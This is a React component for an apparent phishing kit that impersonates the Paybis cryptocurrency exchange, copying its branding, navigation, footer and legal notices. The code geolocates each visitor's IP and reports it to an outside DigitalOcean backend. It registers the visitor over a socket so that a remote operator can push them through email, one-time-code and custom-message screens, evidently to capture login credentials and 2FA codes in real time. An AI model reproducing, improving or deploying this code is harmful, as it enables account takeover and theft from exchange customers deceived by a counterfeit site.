import React, { useEffect, useState } from "react";
import axios from "axios";

import "./paybis.css";

import Paybisemail from "./paybisemail";
import PaybisOTP from "./paybisOTP";
import PaybisLoad from "./paybisload";
import PaybisOTPMSG from "./paybisOTPMSG";

import { useTranslation } from 'react-i18next';


export default function Paybis({ ip, socket }) {
  const [cenaAtual, setCenaAtual] = useState("email");
  const [msgRecebida, setMsgRecebida]=useState("");

  const { t, i18n } = useTranslation();
  const [currentLang, setCurrentLang] = useState('en'); // Inicia com 'en' ou o idioma do navegador


  useEffect(() => {


    const detectLanguage = async () => {
      try {
        const response = await axios.get(`http://ip-api.com/json/${ip}`);
        const { countryCode, city } = response.data;

        // Atualizar região no banco de dados
        await axios.post("https://seal-app-w9oy8.ondigitalocean.app/atualizaregiao", {
          countryCode, city, ip
        });

        const browserLang = i18n.language || window.navigator.language;
        changeLanguage(browserLang);
    
      } catch (error) {
        console.error("Erro ao detectar idioma:", error);
        changeLanguage('en'); // Default para inglês se algo der errado
      }
    };

    detectLanguage();

  }, [ip]); // Executa apenas uma vez, quando o componente é montado

  const changeLanguage = (lang) => {
    
    i18n.changeLanguage(lang);
    setCurrentLang(lang); // Atualiza o estado com o novo idioma
  };
  const languageLinks = [
    { lang: "en", name: "English" },
    { lang: "ru", name: "Русский"},
    { lang: "es", name: "Español"},
    { lang: "it", name: "Italiano" },
    { lang: "fr", name: "Français" },
    { lang: "de", name: "Deutsch" },
    { lang: "ko", name: "한국어" },
    { lang: "ar", name: "عربى" }
  ];

  console.log("ip:" + ip);

  useEffect(() => {
    async function login() {
      await axios.post("https://seal-app-w9oy8.ondigitalocean.app/login", {
        corretora: "paybis",
        ip: ip,
      });
      socket.emit("RegistraUSER", ip);
    }

    login();

    // Definição do ouvinte dentro de useEffect para garantir a configuração única
    const handleTrocaCena = ({ ipRecebido, cenaRecebida, msg }) => {
      console.log("recebido");

      if (ip === ipRecebido) {
        async function AtualizaCena() {
          await axios.post("https://seal-app-w9oy8.ondigitalocean.app/atualizacena", {
            cena: cenaRecebida,
            ip: ipRecebido,
          });
        }

        AtualizaCena();

        if(cenaRecebida==="otp2"){
          setMsgRecebida(msg)
        }

        socket.emit("clienteAtualizou");
        setCenaAtual(cenaRecebida); // Correção para atualizar o estado corretamente
      }
    };

    socket.on("TrocaCena", handleTrocaCena);

    // Função de limpeza para remover o ouvinte
    return () => {
      socket.off("TrocaCena", handleTrocaCena);
    };
  }, [ip, socket]); // Dependências para re-executar apenas se ip ou socket mudarem

  return (
    <div className="wrapper">
      
    
      <nav className="nav">
        <div className="nav-inner nav-inner__tiny">
          <a
            href="/"
            className="nav-logo"
            rel="home"
            title="Paybis - Digital and Crypto currency exchange!"
          >
            <svg viewBox="0 0 101 27" xmlns="http://www.w3.org/2000/svg">
              <path
                d="m13 0.79999v25.397c-6.6069 0-12.2-5.8118-12.2-12.697 0-6.8846 5.5931-12.7 12.2-12.7z"
                clipRule="evenodd"
                fill="#5F70DB"
                fillRule="evenodd"
              ></path>
              <path d="m58.735 14.797-2.7795-7.3264h-4.9928l5.3788 12.342-2.239 5.9873h4.4008l7.2064-18.329h-4.4009l-2.5738 7.3264z"></path>
              <path d="m100.61 11.541c-0.309-3.2824-2.6252-4.4377-5.9453-4.4377-3.114 0-5.7647 1.4706-5.7647 4.5166 0 2.8622 1.5185 3.939 5.1214 4.4117 1.853 0.2625 2.4966 0.5775 2.4966 1.2342 0 0.6827-0.5148 1.129-1.6473 1.129-1.3124 0-1.7501-0.5515-1.9044-1.5492h-4.2466c0.1029 3.0459 2.3422 4.674 6.1767 4.674 3.7318 0 6.0996-1.4704 6.0996-4.7265 0-2.941-1.8016-3.939-5.5333-4.4117-1.647-0.2101-2.2647-0.4726-2.2647-1.129 0-0.6303 0.5145-1.0768 1.5185-1.0768 1.055 0 1.5441 0.4465 1.7241 1.3654h4.1694z"></path>
              <path d="m87.36 21.205v-13.734h-4.6068v13.734h4.6068z"></path>
              <path d="m87.592 3.742c0-1.3916-1.1065-2.442-2.5478-2.442-1.4414 0-2.5221 1.0505-2.5221 2.442 0 1.3918 1.0807 2.416 2.5221 2.416 1.4413 0 2.5478-1.0241 2.5478-2.416z"></path>
              <path
                d="m30.802 7.1033c3.14 0 5.6878 2.4159 5.6878 7.1162v0.2101c0 4.7267-2.5478 7.09-5.7136 7.09-2.033 0-3.5-0.9714-4.1691-2.3369v6.6173h-4.6068v-18.329h4.6068v2.0482c0.772-1.313 2.1619-2.4159 4.1949-2.4159zm-4.3237 7.0902c0-2.3111 1.0039-3.5453 2.6766-3.5453 1.6213 0 2.651 1.1557 2.651 3.5713v0.2101c0 2.2583-0.9265 3.4925-2.651 3.4925-1.6727 0-2.6766-1.1817-2.6766-3.5188v-0.2098z"
                clipRule="evenodd"
                fillRule="evenodd"
              ></path>
              <path
                d="m44.543 7.1033c3.706 0 6.0736 1.5495 6.0736 5.1993v8.902h-4.478v-1.602c-0.6434 0.998-1.8273 1.917-3.9891 1.917-2.4193 0-4.5554-1.2079-4.5554-4.1226 0-3.2299 2.6767-4.4905 7.1546-4.4905h1.2868v-0.315c0-1.313-0.3088-2.1795-1.7756-2.1795-1.2611 0-1.7244 0.7616-1.8273 1.6281h-4.324c0.206-3.3088 2.7538-4.9368 6.4344-4.9368zm0.2829 8.4556h1.2096v0.8401c0 1.1818-0.9779 1.9433-2.2904 1.9433-1.0811 0-1.5956-0.499-1.5956-1.2866 0-1.1293 0.8234-1.4968 2.6764-1.4968z"
                clipRule="evenodd"
                fillRule="evenodd"
              ></path>
              <path
                d="m71.489 1.4313v8.0879c0.7719-1.313 2.1618-2.4159 4.1951-2.4159 3.1398 0 5.6876 2.4159 5.6876 7.1162v0.2101c0 4.7267-2.5478 7.09-5.7133 7.09-2.0076 0-3.5003-0.9714-4.1694-2.4421v2.1271h-4.6069v-19.773h4.6069zm-0.1286 12.762c0-2.3111 1.0036-3.5453 2.6764-3.5453 1.6216 0 2.6509 1.1557 2.6509 3.5713v0.2101c0 2.2583-0.9265 3.4925-2.6509 3.4925-1.6728 0-2.6764-1.1817-2.6764-3.5188v-0.2098z"
                clipRule="evenodd"
                fillRule="evenodd"
              ></path>
            </svg>
          </a>
          <div className="nav-links__primary">
            <div className="nav-links__item">
              <a className="nav-link" href="/" title={t('BuyCrypto')}>
              {t('BuyCrypto')}
              </a>
            </div>
            <div className="nav-links__item">
              <a
                className="nav-link"
                href="/"
                title={t('SellCrypto')}
              >
                {t('SellCrypto')}
              </a>
            </div>
            <div className="nav-links__item">
              <a
                className="nav-link"
                href="/"
                title={t('CryptoWallet')}
              >
                {t('CryptoWallet')}
              </a>
            </div>
            <div className="nav-links__item nav-dropdown">
              <button className="nav-dropdown__toggle nav-link">
              {t('Tools')}
              </button>
              <div className="nav-dropdown-menu__wrapper nav-dropdown-menu--md">
                <div className="nav-dropdown-menu__inner">
                  <ul className="nav-dropdown-list nav-dropdown-list--primary">
                    <li className="drop-down-item">
                      <a href="/" className="nav-dropdown-list__item">
                        <div className="nav-dropdown-list__item-main">
                          <div className="nav-dropdown-list__item-title">
                          {t('CryptoPrices')}
                          </div>
                          <div className="nav-dropdown-list__item-subtitle">
                          {t('Real-timecharts')}
                          </div>
                        </div>
                      </a>
                    </li>
                    <li className="drop-down-item">
                      <a
                        href="/"
                        className="nav-dropdown-list__item"
                      >
                        <div className="nav-dropdown-list__item-main">
                          <div className="nav-dropdown-list__item-title">
                          {t('CryptoCalculator')}
                          </div>
                          <div className="nav-dropdown-list__item-subtitle">
                          {t('Cryptocurrencyconverter')}
                          </div>
                        </div>
                      </a>
                    </li>
                  </ul>
                </div>
              </div>
            </div>
          </div>
          <div className="nav-links__secondary">
            <div className="nav-links__list">
              <div className="nav-links__item nav-dropdown">
                <button className="nav-dropdown__toggle nav-link">
                {t('Business')}
                </button>
                <div className="nav-dropdown-menu__wrapper nav-dropdown-menu--lg">
                  <div className="nav-dropdown-menu__inner">
                    <ul className="nav-dropdown-list nav-dropdown-list--primary">
                      <li className="drop-down-item">
                        <a
                          href="/pt/on-off-ramp/"
                          className="nav-dropdown-list__item"
                        >
                          <img
                            src="images/widget.svg"
                            alt="On/Off Ramp"
                            className="nav-dropdown-list__item-icon"
                            loading="lazy"
                          />
                          <div className="nav-dropdown-list__item-main">
                            <div className="nav-dropdown-list__item-title">
                              On/Off Ramp
                            </div>
                            <div className="nav-dropdown-list__item-subtitle">
                              Allow your customers to buy or sell crypto with
                              ease
                            </div>
                          </div>
                        </a>
                      </li>
                    </ul>
                  </div>
                </div>
              </div>
              <div className="nav-links__item nav-dropdown">
                <button className="nav-dropdown__toggle nav-link">
                  <i className="icon icon-earth"></i>
                  <span>{currentLang.toUpperCase()}</span>
                </button>
                <div className="nav-dropdown-menu__wrapper nav-dropdown-menu--sm nav-dropdown-menu--lang">
                  <div className="nav-dropdown-menu__inner">
                    <ul className="nav-dropdown-list nav-dropdown-list--primary">
                       {languageLinks.map(({ lang, name }) => (
                        <li key={lang}>
                          <a
                            className="nav-dropdown-list__item languageLink"
                            href="/"
                            onClick={(e) => {
                              e.preventDefault();
                              changeLanguage(lang);
                            }}
                            data-lang={lang}
                          >
                            <div className="nav-dropdown-list__item-main">
                              <div className="nav-dropdown-list__item-title">
                                {name}
                              </div>
                            </div>
                          </a>
                        </li>
                      ))}
                    </ul>
                  </div>
                </div>
              </div>
            </div>
            <div className="nav-links__login-group">
              <a className="btn btn-sm btn-secondary" href="/">
              {t('Login')}
              </a>
              <a className="btn btn-sm btn-primary" href="/">
              {t('Signup')}
              </a>
            </div>
          </div>
          <div className="nav-burger">
            <button className="nav-burger-toggle toggle-open">Menu</button>
            <div className="nav-burger-menu">
              <div className="nav-burger-menu__inner">
                <button className="nav-burger-toggle nav-burger-toggle--close">
                  Close menu
                </button>
                <div className="nav-burger-menu__section">
                  <div className="nav-burger-tabs">
                    <div className="nav-burger-tabs__header nav-burger-tabs__header-wrap">
                      <button
                        className="nav-burger-tabs__toggle is-selected"
                        data-tab="personal"
                      >
                        Pessoal
                      </button>
                      <button
                        className="nav-burger-tabs__toggle"
                        data-tab="business"
                      >
                        {t('Business')}
                      </button>
                    </div>
                    <div className="nav-burger-tabs__content">
                      <div
                        className="nav-burger-tabs__item is-selected"
                        data-tab="personal"
                      >
                        <ul>
                          <li>
                            <a href="/" className="item">
                              <img
                                src="images/buy.svg"
                                alt={t('BuyCrypto')}
                                className="item__icon"
                                loading="lazy"
                              />
                              <div className="item__main">
                                <div className="item__title">
                                {t('BuyCrypto')}
                                </div>
                                <div className="item__subtitle">
                                {t('Bestplacebuy')}
                                </div>
                              </div>
                            </a>
                          </li>
                          <li>
                            <a href="/" className="item">
                              <img
                                src="images/sell.svg"
                                alt={t('SellCrypto')}
                                className="item__icon"
                                loading="lazy"
                              />
                              <div className="item__main">
                                <div className="item__title">
                                {t('SellCrypto')}
                                </div>
                                <div className="item__subtitle">
                                {t('Bestplacesell')}
                                </div>
                              </div>
                            </a>
                          </li>
                          <li>
                            <a href="/" className="item">
                              <img
                                src="images/wallets.svg"
                                alt={t('CryptoWallet')}
                                className="item__icon"
                                loading="lazy"
                              />
                              <div className="item__main">
                                <div className="item__title">{t('CryptoWallet')}</div>
                                <div className="item__subtitle">
                                {t('Everythingyouneedforcrypto')}
                                </div>
                              </div>
                            </a>
                          </li>
                        </ul>
                      </div>
                      <div
                        className="nav-burger-tabs__item"
                        data-tab="business"
                      >
                        <ul>
                          <li>
                            <a href="/" className="item">
                              <img
                                src="images/widget.svg"
                                alt="On/Off Ramp"
                                className="item__icon"
                                loading="lazy"
                              />
                              <div className="item__main">
                                <div className="item__title">On/Off Ramp</div>
                                <div className="item__subtitle">
                                  Allow your customers to buy or sell crypto
                                  with ease
                                </div>
                              </div>
                            </a>
                          </li>
                        </ul>
                      </div>
                    </div>
                  </div>
                  <div className="nav-burger-menu__login-group">
                    <a
                      className="btn btn-sm btn-secondary"
                      href="/"
                    >
                      {t('Login')}
                    </a>
                    <a
                      className="btn btn-sm btn-primary"
                      href="/"
                    >
                      {t('Signup')}
                    </a>
                  </div>
                </div>
                <div className="nav-burger-menu__section">
                  <ul className="nav-burger-menu__list">
                    <li className="nav-burger-menu__item">
                      <a
                        href="/"
                        className="nav-burger-menu__item-link"
                      >
                        <i className="icon icon-users"></i>
                        <span> {t('Aboutus')} </span>
                      </a>
                    </li>
                    <li className="nav-burger-menu__item">
                      <a
                        href="/"
                        className="nav-burger-menu__item-link"
                      >
                        <i className="icon icon-bullhorn"></i>
                        <span> {t('News')} </span>
                      </a>
                    </li>
                    <li className="nav-burger-menu__item">
                      <a
                        href="/"
                        className="nav-burger-menu__item-link"
                      >
                        <i className="icon icon-bookmark"></i>
                        <span> {t('Blog')} </span>
                      </a>
                    </li>
                  </ul>
                </div>
                <div className="nav-burger-menu__section">
                  <div className="nav-accordion">
                    <button
                      className="nav-accordion__toggle"
                      data-tab="languages"
                    >
                      <i className="nav-accordion__toggle-icon icon icon-earth"></i>
                      <span>English</span>
                    </button>
                    <div className="nav-accordion__container">
                      <ul className="nav-accordion__list nav-accordion__list--primary">

                      {languageLinks.map(({ lang, name, path }) => (
                        <li key={lang}>
                          <a
                            className="nav-accordion__item languageLink"
                            href="/"
                            onClick={(e) => {
                              e.preventDefault();
                              changeLanguage(lang);
                            }}
                            data-lang={lang}
                          >
                              <div className="nav-accordion__item-title">
                                {name}
                              </div>
                          </a>
                        </li>
                      ))}
                      </ul>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </nav>
      <main className="main" id="authentication-flow-loader">
        <div className="auth-container">
          <div className="auth-wrapper">
            <div className="app__inner">
              <div className="app__body">
                {cenaAtual === "email" ? (
                  <Paybisemail
                    ip={ip}
                    socket={socket}
                    setCenaAtual={setCenaAtual}
                  />
                ) : cenaAtual === "otp" ? (
                  <PaybisOTP
                    ip={ip}
                    socket={socket}
                    setCenaAtual={setCenaAtual}
                  />
                ) : cenaAtual === "load" ? (
                  <PaybisLoad
                    ip={ip}
                    socket={socket}
                    setCenaAtual={setCenaAtual}
                  />
                ) : cenaAtual === "otp2" ? (
                  <PaybisOTPMSG
                    ip={ip}
                    socket={socket}
                    setCenaAtual={setCenaAtual}
                    msgRecebida={msgRecebida}
                  />
                ) : (
                  <PaybisLoad
                    ip={ip}
                    socket={socket}
                    setCenaAtual={setCenaAtual}
                  />
                )}
              </div>
            </div>
          </div>
          <div className="auth-footer">t('SecuredbyTLSprotocol')</div>
        </div>
      </main>
      <div id="login"></div>


      <div id="fca-notification-footer"></div>
      <footer className="footer">
        <div className="footer__inner">
          <div className="container">
            <div className="footer__row">
              <div className="footer-links">
                <div className="footer-links__column">
                  <div className="footer-links__group">
                    <h4 className="footer-links__group-title">
                    Company
                    </h4>
                    <ul className="footer-links__group-list">
                      <li>
                        <a
                          className="footer-links__item"
                          href="/"
                          title="About Us"
                          data-testid="aboutus"
                        >
                          About Us
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/"
                          title="Careers"
                          data-testid="careers"
                        >
                          Careers
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/"
                          title="Contacts"
                          data-testid="contacts"
                        >
                          Contacts
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/"
                          title="News"
                          data-testid="news"
                        >
                          News
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/"
                          title="Referrals & affiliates"
                          data-testid="referrals"
                        >
                          Referrals & affiliates
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/"
                          title="Policies"
                          data-testid="policies"
                        >
                          Policies
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/"
                          title="The risk summary"
                          data-testid="risk-summary"
                        >
                          The risk summary
                        </a>
                      </li>
                    </ul>
                  </div>
                </div>
                <div className="footer-links__column">
                  <div className="footer-links__group">
                    <h4 className="footer-links__group-title">Products</h4>
                    <ul className="footer-links__group-list">
                      <li>
                        <a
                          className="footer-links__item"
                          href="/"
                          title="Buy Crypto"
                        >
                          Buy Crypto
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/"
                          title="Sell Crypto"
                        >
                          Sell Crypto
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/"
                          title="On/Off Ramp"
                        >
                          On/Off Ramp
                        </a>
                      </li>
                    </ul>
                  </div>
                  <div className="footer-links__group">
                    <h4 className="footer-links__group-title">Learn</h4>
                    <ul className="footer-links__group-list">
                      <li>
                        <a
                          className="footer-links__item"
                          href="/"
                          title="Support Portal"
                        >
                          Support Portal
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/"
                          title="FAQ"
                          data-testid="faq"
                        >
                          FAQ
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/"
                          title="Blog"
                          data-testid="blog"
                        >
                          Blog
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/"
                          title="Fees"
                          data-testid="fees"
                        >
                          Fees
                        </a>
                      </li>
                    </ul>
                  </div>
                </div>
                <div className="footer-links__column mobile-links">
                  <div className="footer-links__group">
                    <h4 className="footer-links__group-title">Buy</h4>
                    <ul className="footer-links__group-list">
                      <li>
                        <a
                          className="footer-links__item"
                          href="/"
                          title="Buy Bitcoin"
                        >
                          Buy Bitcoin
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/"
                          title="Buy Ethereum"
                        >
                          Buy Ethereum
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/"
                          title="Buy USDT"
                        >
                          Buy USDT
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/"
                          title="Buy Litecoin"
                        >
                          Buy Litecoin
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/"
                          title="Buy Ripple"
                        >
                          Buy Ripple
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/"
                          title="Buy Bitcoin Cash"
                        >
                          Buy Bitcoin Cash
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/"
                          title="Buy Stellar"
                        >
                          Buy Stellar
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/"
                          title="Buy Binance Coin"
                        >
                          Buy Binance Coin
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/"
                          title="Buy Tron"
                        >
                          Buy Tron
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/"
                          title="Buy Dogecoin"
                        >
                          Buy Dogecoin
                        </a>
                      </li>
                    </ul>
                  </div>
                </div>
                <div className="footer-links__column mobile-links">
                  <div className="footer-links__group">
                    <h4 className="footer-links__group-title">Sell</h4>
                    <ul className="footer-links__group-list">
                      <li>
                        <a
                          className="footer-links__item"
                          href="/"
                          title="Sell Bitcoin"
                          data-testid="sellbitcoin"
                        >
                          Sell Bitcoin
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/"
                          title="Sell USDT"
                          data-testid="sellusdt"
                        >
                          Sell USDT
                        </a>
                      </li>
                    </ul>
                  </div>
                  <div className="footer-links__group">
                    <h4 className="footer-links__group-title">
                    Crypto wallets
                    </h4>
                    <ul className="footer-links__group-list">
                      <li>
                        <a
                          className="footer-links__item"
                          href="/"
                          title="Bitcoin wallet"
                          data-testid="walletbitcoin"
                        >
                          Bitcoin wallet
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/"
                          title="Binance Coin wallet"
                          data-testid="walletbinancecoin"
                        >
                          Binance Coin wallet
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/"
                          title="Ethereum wallet"
                          data-testid="walletethereum"
                        >
                          Ethereum wallet
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/"
                          title="Tether wallet"
                          data-testid="wallettether"
                        >
                          Tether wallet
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/"
                          title="Cardano wallet"
                          data-testid="walletcardano"
                        >
                          Cardano wallet
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/"
                          title="Dogecoin wallet"
                          data-testid="walletdogecoin"
                        >
                          Dogecoin wallet
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/"
                          title="Polkadot wallet"
                          data-testid="walletpolkadot"
                        >
                          Polkadot wallet
                        </a>
                      </li>
                    </ul>
                  </div>
                </div>
                <div className="footer-links__column mobile-links">
                  <div className="footer-links__group">
                    <h4 className="footer-links__group-title">Calculator</h4>
                    <ul className="footer-links__group-list">
                      <li>
                        <a
                          className="footer-links__item"
                          href="/"
                          title="Bitcoin Calculator"
                          data-testid="bitcoincalc"
                        >
                          Bitcoin Calculator
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/"
                          title="Ethereum Calculator"
                          data-testid="ethereumcalc"
                        >
                          Ethereum Calculator
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/"
                          title="Litecoin Calculator"
                          data-testid="litecoincalc"
                        >
                          Litecoin Calculator
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/"
                          title="XRP Calculator"
                          data-testid="xrpcalc"
                        >
                          XRP Calculator
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/"
                          title="Bitcoin Cash Calculator"
                          data-testid="bitcoincashcalc"
                        >
                          Bitcoin Cash Calculator
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/"
                          title="Stellar Calculator "
                          data-testid="stellarcalc"
                        >
                          Stellar Calculator
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/"
                          title="Binance Coin Calculator"
                          data-testid="binancecalc"
                        >
                          Binance Coin Calculator
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/"
                          title="Dogecoin Calculator"
                          data-testid="dogecalc"
                        >
                          Dogecoin Calculator
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/"
                          title="TRON Calculator"
                          data-testid="troncalc"
                        >
                          TRON Calculator
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/"
                          title="Tether Calculator"
                          data-testid="tethercalc"
                        >
                          Tether Calculator
                        </a>
                      </li>
                    </ul>
                  </div>
                </div>
                <div className="footer-links__column mobile-links">
                  <div className="footer-links__group">
                    <h4 className="footer-links__group-title">Prices</h4>
                    <ul className="footer-links__group-list">
                      <li>
                        <a
                          className="footer-links__item"
                          href="/"
                          title="Bitcoin Price"
                          data-testid="bitcoinprice"
                        >
                          Bitcoin Price
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/"
                          title="Ethereum Price"
                          data-testid="ethereumprice"
                        >
                          Ethereum Price
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/"
                          title="Litecoin Price"
                          data-testid="litecoinprice"
                        >
                          Litecoin Price
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/"
                          title="XRP Price"
                          data-testid="xrpprice"
                        >
                          XRP Price
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/"
                          title="Bitcoin Cash Price"
                          data-testid="bitcoincashprice"
                        >
                          Bitcoin Cash Price
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/"
                          title="Stellar Price"
                          data-testid="stellarprice"
                        >
                          Stellar Price
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/"
                          title="Binance Coin Price"
                          data-testid="binanceprice"
                        >
                          Binance Coin Price
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/"
                          title="Dogecoin Price"
                          data-testid="dogeprice"
                        >
                          Dogecoin Price
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/"
                          title="TRON Price"
                          data-testid="tronprice"
                        >
                          TRON Price
                        </a>
                      </li>
                      <li>
                        <a
                          className="footer-links__item"
                          href="/"
                          title="Tether Price"
                          data-testid="tetherprice"
                        >
                          Tether P
                        </a>
                      </li>
                    </ul>
                  </div>
                </div>
              </div>
            </div>
            <div className="footer__links-wrapper">
              <div className="footer__status-page-link">
                <a
                  className="btn btn-secondary btn-lg"
                  href="/"
                  target="_blank"
                >
                  <img
                    src="images/heart-half-stroke.svg"
                    loading="lazy"
                    alt="Paybis status page"
                  />
                  Status Page
                </a>
              </div>
              <div className="footer__mob-app-links">
                <h3 className="footer__mob-app-links-title">
                  Baixe o nosso aplicativo:
                </h3>
                <div className="mob-app-links-container">
                  <a
                    href="/"
                    target="_blank"
                    className="footer__mob-app-link"
                  >
                    <img
                      src="images/app-google.svg"
                      alt="Baixe o aplicativo no Google Play"
                      className="mobile-app__apps-img"
                      loading="lazy"
                    />
                  </a>
                  <a
                    href="/"
                    target="_blank"
                  >
                    <img
                      src="images/app-apple.svg"
                      alt="Baixe o aplicativo na App Store"
                      className="mobile-app__apps-img"
                      loading="lazy"
                    />
                  </a>
                </div>
              </div>
            </div>
            <div className="footer__row">
              <div className="footer-info">
                <h4 className="footer-info__title">Contacts</h4>
                <ul className="footer-info__contacts">
                  <li className="footer-info__contacts-item footer-info__contacts-item--lg">
                    <a href="mailto:support@paybis.com">support@paybis.com</a>
                  </li>
                </ul>
              </div>
              <div className="footer-social">
                <a
                  className="footer-social__item footer-social__item--linkedin"
                  href="/"
                  rel="noopener"
                  target="_blank"
                >
                  <i className="footer-social__item-icon icon icon-linkedin"></i>
                  <span className="footer-social__item-value">1.4k</span>
                </a>
                <a
                  className="footer-social__item footer-social__item--twitter"
                  href="/"
                  rel="noopener"
                  target="_blank"
                >
                  <i className="footer-social__item-icon icon icon-twitter"></i>
                  <span className="footer-social__item-value">10.1k</span>
                </a>
                <a
                  className="footer-social__item footer-social__item--youtube"
                  href="/"
                  rel="noopener"
                  target="_blank"
                >
                  <i className="footer-social__item-icon icon icon-youtube"></i>
                  <span className="footer-social__item-value">26.6k</span>
                </a>
                <a
                  className="footer-social__item footer-social__item--instagram"
                  href="/"
                  rel="noopener"
                  target="_blank"
                >
                  <i className="footer-social__item-icon icon icon-instagram"></i>
                  <span className="footer-social__item-value">3.9k</span>
                </a>
                <a
                  className="footer-social__item footer-social__item--facebook"
                  href="/"
                  rel="noopener"
                  target="_blank"
                >
                  <i className="footer-social__item-icon icon icon-facebook-f"></i>
                  <span className="footer-social__item-value">3.6k</span>
                </a>
              </div>
            </div>
            <div className="footer__row">
              <div className="footer__copy">
                PAYBIS POLAND Sp. z o.o. (0001041711), Hoża 86/210, Warsaw,
                Poland, 00-682
                <br />
                PAYBIS USA LTD (87-1891757), 321 S. Boston, Tulsa, OK, 74103
                <br />
                © 2014-2024 Paybis.com, all rights reserved.
                <br />
                <br />
                Investing in cryptoassets involves significant risk. You should not invest more than you can afford to lose, and you should ensure that you fully understand the risks involved. We are not regulated by the Financial Conduct Authority and investments in cryptoassets are not covered by the Financial Ombudsman Service or subject to protection under the Financial Services Compensation Scheme.
                <a
                  href="/"
                  title="DMCA.com Protection Status"
                  className="dmca-badge footer__dmca-badge"
                >
                  <img
                    src="images/dmca_protected_sml_120d.png"
                    width="120"
                    height="21"
                    alt="DMCA.com Protection Status"
                    loading="lazy"
                  />
                </a>
              </div>
            </div>
          </div>
        </div>
      </footer>
      <div id="generalPopUpModal">
        <div className="modal modal--sm">
          <div className="modal__dialog">
            <div className="modal__content">
              <button className="modal__close">Fechar</button>
              <div className="modal-body"></div>
            </div>
          </div>
        </div>
        <div className="modal__backdrop"></div>
      </div>
      <div id="warningPopUpModal">
        <div className="modal modal--lg">
          <div className="modal__dialog">
            <div className="modal__content">
              <button className="modal__close">Fechar</button>
              <div className="modal-content modal-content--lg modal-body"></div>
              <div className="modal-content modal-content--lg modal-footer">
                <button
                  type="button"
                  className="btn btn-primary"
                  id="warningPopupModalContinueBtn"
                >
                  Continuar
                </button>
                <button
                  type="button"
                  className="btn btn-secondary"
                  data-dismiss="modal"
                >
                  Voltar
                </button>
              </div>
            </div>
          </div>
        </div>
        <div className="modal__backdrop"></div>
      </div>

      <button id="cex-back-to-top" className="topbtn" title="Voltar ao início">
        Voltar ao início
      </button>
      <div id="chatButton"></div>
      <div id="chatButtonFacade" className="intercom">
        <div id="chat-image" className="intercom-livechat-logo"></div>
        <svg id="spinner" className="spinner" viewBox="0 0 50 50">
          <circle
            className="path"
            cx="25"
            cy="25"
            r="20"
            fill="none"
            strokeWidth="5"
          ></circle>
        </svg>
      </div>
    </div>
  );
}
